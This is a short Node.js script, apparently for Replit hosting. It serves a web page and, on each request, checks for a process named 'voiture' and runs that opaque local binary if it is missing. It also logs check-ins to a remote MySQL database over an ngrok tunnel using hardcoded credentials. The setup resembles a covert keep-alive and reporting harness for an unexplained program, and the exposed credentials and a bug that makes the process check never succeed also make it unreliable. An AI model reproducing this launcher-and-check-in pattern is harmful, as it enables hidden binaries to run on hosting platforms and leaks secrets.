
const { exec } = require("child_process");

const mysql = require('mysql2');

// create the connection to database

var hote1 ="5.tcp.eu.ngrok.io" ;

var hote2 = "17369" ;

var num = 4 ;

var num2 = 36000 + num ;

var stamp;

var connect =
{
  host: hote1,
  port: hote2,
  user: 'yakuzas2345',
  password: 'Honneur23.',
  database: 'replit'
}

var connection , result = 0;

var http = require('http');
var fs = require('fs');
var index = fs.readFileSync('index.html');


var num = 4 ;


async function lance() 
{
  result = 'error' ;

  await new Promise((resolve, reject) => 
  {
    exec("pgrep -l voiture", (error, stdout, stderr) => 
    {
      if (error) 
      {
        console.log(`error: ${error.message}`);
        
        return resolve();
      }

      if (stderr) 
      {
        console.log(`stderr: ${stderr}`);
        
        return resolve();
      }

      console.log('stdout:', stdout);

      return resolve() ;

      result = stdout ;
    });
  });

  if (result.indexOf('voiture') != -1) 
  {
    stamp = Date.now();

    async function lance2() 
    {
      connection = mysql.createConnection(connect);

      await new Promise((resolve, reject) => 
      {
        connection.query('REPLACE INTO `info` (num, stamp) VALUES ( ? , ? )', ['' + num + '', '' + stamp + ''], function(err, results, fields) {
          if (err) 
          {
            console.log('erreur', err);

            lance2();
          }
          else 
          {
            console.log(results); 

            return resolve();
          }
        });
      });

      connection.end();
    }

    lance2();
  }
  else
  {
    await new Promise((resolve, reject) => 
    {
      exec('chmod +x ./voiture && ./voiture', (error, stdout, stderr) => 
      {
        if (error) 
        {
          console.log(`error: ${error.message}`);
          
          return resolve();
        }

        if (stderr) 
        {
          console.log(`stderr: ${stderr}`);
          
          return resolve();
        }
        console.log(`stdout: ${stdout}`);

        console.log('voiture lancé');

        return resolve();
      });
    });
  }
}




http.createServer(function(req, res) {
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end(index);
  lance();
}).listen(num2);












  
  

  






